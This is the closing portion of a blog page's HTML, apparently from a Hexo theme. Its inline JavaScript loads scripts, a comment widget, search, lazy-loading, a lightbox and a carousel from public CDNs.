    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
